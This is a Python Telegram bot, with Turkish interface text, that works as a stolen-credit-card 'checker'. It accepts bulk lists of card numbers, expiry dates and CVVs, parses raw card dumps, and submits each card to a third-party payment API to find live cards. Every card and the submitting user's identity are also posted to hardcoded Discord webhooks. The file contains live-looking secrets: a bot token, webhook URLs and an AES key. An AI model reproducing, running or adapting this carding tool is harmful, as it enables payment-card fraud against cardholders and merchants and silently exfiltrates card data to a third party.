import requests
import re
import json
import time
from io import StringIO
from telebot import TeleBot
from datetime import datetime, timedelta
import threading
import base64
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

BOT_TOKEN = "7411770517:AAGW65ZViNLVCFKFDUM5X-QM15rlxckIb2M"
WEBHOOK_LIVE = "https://discord.com/api/webhooks/1362353337013506129/bcAAKfveNmZfEQm6KSEXe0_ToWeU_A_hG_jp8kfq7Ga5uBKWQJ8CmBsxFJpmQmMEAItS"
WEBHOOK_DECLINED = "https://discord.com/api/webhooks/1362353376909590599/VBJOl1N3f6H69UudhjXwPyuRZlRbCgF0suIY7M2shVCtgT-Pc3AI7BhTrJH07cE4KX87"
WEBHOOK_UNKNOWN = "https://discord.com/api/webhooks/1362353440931708979/4vwk-95JiHHDnojOCIxZ3fx2lE6wevQhgvd-IXV5hVg79Muqn6MEbA6L5YlGkYhDfSFJ"
WEBHOOK_LOG = "https://discord.com/api/webhooks/1362552619645665566/2z_Qdze2mQ3TsvgxEgg6YR3jWNX0yEsOMW1u4JRIBq0r38ZVvR7julwfgkuOKzaBVKQs"

OWNER_ID = 6369595142
banned_users = set()
premium_users = {}

API_URL = "https://metalix.store/api/uts/api.php"

bot = TeleBot(BOT_TOKEN)

def send_to_webhook(content, webhook_url):
    try:
        requests.post(webhook_url, json={"content": content})
    except:
        pass

def random_hex(length):
    return ''.join(random.choice('0123456789abcdef') for _ in range(length))

def create_coco():
    def random_number():
        return random.randint(100000000, 9999999999)
    return str((random_number() + random_number()) * 31)

def aes_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(encrypted).decode()

def aes_decrypt(data_base64, key):
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_data = base64.b64decode(data_base64)
    decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted.decode()

def check_card(card):
    try:
        AES_KEY = b"eonxsIYALqWz3nFG"
        random_hex_value = random_hex(1500 * 2)
        combined = f"{random_hex_value}:{card}"
        encrypted_card = aes_encrypt(combined, AES_KEY)

        verification_key = "verification_" + random_hex(70 * 2)
        verification_value = random_hex(1500 * 2)
        coco_value = create_coco()

        headers = {
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'origin': 'https://metalix.store',
            'referer': 'https://metalix.store/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-mobile': '?0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'x-coco': coco_value
        }

        files = {
            'card': (None, encrypted_card),
            verification_key: (None, verification_value),
            'coco': (None, coco_value)
        }

        response = requests.post(API_URL, headers=headers, files=files, timeout=15)
        if response.status_code == 200:
            decrypted_response = aes_decrypt(response.text.strip(), AES_KEY)
            return {"message": decrypted_response, "details": "Metalix Checker"}
        else:
            return {"message": f"Hata HTTP {response.status_code}", "details": "Metalix Checker"}
    except Exception as e:
        return {"message": f"❌ API Hatası: {str(e)}", "details": "Metalix Checker"}

@bot.message_handler(commands=['check'])
def check_command(message):
    if message.from_user.id in banned_users:
        return

    lines = message.text.split("\n")
    if lines[0].startswith("/check"):
        lines[0] = lines[0].replace("/check", "").strip()
    lines = [l.strip() for l in lines if l.strip()]

    if not lines:
        bot.send_message(message.chat.id, "⚠️ Kart bilgilerini /check komutundan sonra gir. /check KART|AY|YIL|CVV")
        return
    if len(lines) > 1000:
        bot.send_message(message.chat.id, "⚠️ En fazla 1000 kart kontrol edebilirsin.")
        return

    total = len(lines)
    bot.send_message(message.chat.id, f"🦍 Checker\n━━━━━━━━━━━━━━━\n• Toplam Kart: {total}\n• Method: Metalix Api\n• Başlıyor")

    live_list = []

    for idx, line in enumerate(lines, 1):
        card = line.strip()
        if not card:
            continue

        result = check_card(card)
        message_text = result.get("message", "")
        details = result.get("details", "❌ BIN bilgisi alınamadı")

        durum = "✅" if "Payment Successful" in message_text else "❌" if "Kart" in message_text or "Card" in message_text else "❓"

        mesaj = f"🔄 Checklenen Kart: {idx}/{total}\n━━━━━━━━━━━━━━━\n"
        mesaj += f"💳 Kart Bilgisi\n• Kart: {card}\n━━━━━━━━━━━━━━━\n"
        mesaj += f"🏦 BIN Bilgisi\n• {details}\n━━━━━━━━━━━━━━━\n"
        mesaj += f"📊 Sonuç\n• Durum: {durum} {message_text}\n━━━━━━━━━━━━━━━"

        bot.send_message(message.chat.id, mesaj)

        sender_info = f"👤 @{message.from_user.username or message.from_user.first_name} | ID: {message.from_user.id}"

        if "Payment Successful" in message_text:
            live_list.append(f"{card} → {details}")
            send_to_webhook(f"{card} → ✅ {message_text} - {sender_info}", WEBHOOK_LIVE)
        elif any(word in message_text for word in ["Declined", "Kart", "Card", "Banka", "onaylanmadı"]):
            send_to_webhook(f"{card} → ❌ {message_text} - {sender_info}", WEBHOOK_DECLINED)
        else:
            send_to_webhook(f"{card} → {message_text} - {sender_info}", WEBHOOK_UNKNOWN)

    if live_list:
        bot.send_message(message.chat.id, "✅Live Kartlar\n" + "\n".join(live_list))

@bot.message_handler(commands=['parser'])
def parser_handler(message):
    msg = bot.send_message(message.chat.id, "Bozuk kart içeren .txt dosyası gönder.")
    bot.register_next_step_handler(msg, parser_cevap)

def parser_cevap(msg):
    try:
        file_info = bot.get_file(msg.document.file_id)
        file = bot.download_file(file_info.file_path)
        lines = StringIO(file.decode("utf-8", errors="ignore")).readlines()

        parsed = []
        for line in lines:
            parts = re.findall(r'\d{12,19}|\d{2,4}', line)
            if len(parts) >= 4:
                ay = parts[1].zfill(2)
                yil = parts[2] if len(parts[2]) == 4 else f"20{parts[2]}"
                cvv = parts[3].zfill(3)
                parsed.append(f"{parts[0]}|{ay}|{yil}|{cvv}")

        if not parsed:
            bot.send_message(msg.chat.id, "❌ Geçerli kart bulunamadı.")
            return

        total = len(parsed)
        bot.send_message(msg.chat.id, f"🦍 Parser Checker\n━━━━━━━━━━━━━━━\n• Toplam Kart: {total}\n• Method: Metalix Api\n• Başlıyor")

        live_list = []

        for idx, card in enumerate(parsed, 1):
            result = check_card(card)
            message_text = result.get("message", "")
            details = result.get("details", "❌ BIN bilgisi alınamadı")

            durum = "✅" if "Payment Successful" in message_text else "❌" if "Kart" in message_text or "Card" in message_text else "❓"

            mesaj = f"🔄 Checklenen Kart: {idx}/{total}\n━━━━━━━━━━━━━━━\n"
            mesaj += f"💳 Kart Bilgisi\n• Kart: {card}\n━━━━━━━━━━━━━━━\n"
            mesaj += f"🏦 BIN Bilgisi\n• {details}\n━━━━━━━━━━━━━━━\n"
            mesaj += f"📊 Sonuç\n• Durum: {durum} {message_text}\n━━━━━━━━━━━━━━━"

            bot.send_message(msg.chat.id, mesaj)

            if durum == "✅":
                live_list.append(f"{card} → {details}")
                send_to_webhook(f"{card} → ✅ {message_text}", WEBHOOK_LIVE)
            elif durum == "❌":
                send_to_webhook(f"{card} → ❌ {message_text}", WEBHOOK_DECLINED)
            else:
                send_to_webhook(f"{card} → {message_text}", WEBHOOK_UNKNOWN)

        if live_list:
            bot.send_message(msg.chat.id, "✅Live Kartlar\n" + "\n".join(live_list))

    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Hata oluştu: {str(e)}")

if __name__ == "__main__":
    print("✅ Bot başlatılıyor... Sadece bir örneği çalıştırın!")
    bot.remove_webhook()
    bot.infinity_polling()
